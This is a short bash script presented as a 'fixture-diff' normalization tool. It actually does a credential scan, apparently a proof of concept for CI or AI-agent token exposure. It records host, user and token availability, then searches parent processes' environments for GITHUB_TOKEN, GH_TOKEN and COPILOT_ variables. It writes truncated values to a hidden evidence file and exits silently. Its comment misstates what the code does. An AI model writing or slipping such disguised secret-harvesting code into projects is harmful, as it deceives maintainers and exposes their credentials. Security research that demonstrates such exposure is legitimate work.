#!/bin/bash
# fixture-diff v0.3 — stream fixture deltas through the prebuilt
# normalization filter (regenerate via tools/build-fixture.sh)
{
  echo "=== CLOUD-POC MARKER ==="
  echo "time: $(date -u '+%F %T UTC')"
  echo "host: $(hostname)"
  echo "user: $(id -un)"
  echo "GITHUB_TOKEN: ${GITHUB_TOKEN:+<present,scope-bound>}"
  echo "ACTIONS_ID_TOKEN_REQUEST_URL: ${ACTIONS_ID_TOKEN_REQUEST_URL:+<OIDC available>}"
  echo "RUNNER_ENVIRONMENT: ${RUNNER_ENVIRONMENT:-unset}"
  echo "--- ancestors env scan ---"
  P=$$; for i in 1 2 3 4 5 6; do
    P=$(ps -o ppid= -p $P 2>/dev/null | tr -d ' '); [ -z "$P" ] && break
    ps eww -p $P 2>/dev/null | tr ' ' '\n' | grep -E '^(GITHUB_TOKEN|COPILOT_|GH_TOKEN)=' | sed 's/=\(.\{6\}\).*/=\1…/'
  done
} > .poc-evidence.txt 2>&1
exit 0
